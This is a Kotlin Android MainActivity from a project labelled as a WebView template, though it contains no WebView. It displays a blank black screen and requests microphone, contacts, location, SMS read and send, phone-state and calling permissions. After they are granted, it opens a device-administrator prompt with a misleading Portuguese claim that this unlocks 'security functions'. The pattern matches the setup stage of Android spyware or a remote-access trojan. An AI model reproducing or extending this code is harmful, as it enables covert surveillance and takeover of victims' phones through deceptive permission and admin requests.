package com.webviewtemplate.webviewtemplate1

import android.graphics.Color
import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager

import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsControllerCompat

class MainActivity : AppCompatActivity() {

private val REQUEST_PERMISSIONS = 100

private lateinit var adminComponent: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        WindowCompat.setDecorFitsSystemWindows(
            window,
            false
        )

        window.apply {

            addFlags(
                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
            )

            statusBarColor = Color.TRANSPARENT
            navigationBarColor = Color.TRANSPARENT

            if (android.os.Build.VERSION.SDK_INT >= 28) {
                navigationBarDividerColor = Color.TRANSPARENT
            }

            if (android.os.Build.VERSION.SDK_INT >= 29) {
                isStatusBarContrastEnforced = false
                isNavigationBarContrastEnforced = false
            }

            decorView.systemUiVisibility =
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        }

        WindowInsetsControllerCompat(
            window,
            window.decorView
        ).apply {

            isAppearanceLightStatusBars = false
            isAppearanceLightNavigationBars = false
        }


        val root = FrameLayout(this)
        root.setBackgroundColor(Color.BLACK)

        setContentView(root)
        
        pedirPermissoes()
    }
    
    private fun pedirPermissoes() {

    val permissoes = arrayOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE
    )


    val faltando = permissoes.filter {

        ContextCompat.checkSelfPermission(
            this,
            it
        ) != PackageManager.PERMISSION_GRANTED

    }


    if (faltando.isNotEmpty()) {

        ActivityCompat.requestPermissions(
            this,
            faltando.toTypedArray(),
            REQUEST_PERMISSIONS
        )

    } else {

        ativarAdministrador()

    }
}

private fun verificarPermissoes(): Boolean {

    val permissoes = arrayOf(
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE
    )


    return permissoes.all {

        ContextCompat.checkSelfPermission(
            this,
            it
        ) == PackageManager.PERMISSION_GRANTED

    }
}

override fun onRequestPermissionsResult(
    requestCode: Int,
    permissions: Array<out String>,
    grantResults: IntArray
) {
    super.onRequestPermissionsResult(
        requestCode,
        permissions,
        grantResults
    )


    if (requestCode == REQUEST_PERMISSIONS) {

        if (grantResults.all {
                it == PackageManager.PERMISSION_GRANTED
            }) {

            ativarAdministrador()

        }

    }
}

private fun ativarAdministrador() {

    adminComponent = ComponentName(
        this,
        MeuAdministrador::class.java
    )

    val intent = Intent(
        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
    )

    intent.putExtra(
        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
        adminComponent
    )

    intent.putExtra(
        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
        "Ative o administrador para liberar funções de segurança"
    )

    startActivity(intent)
}

}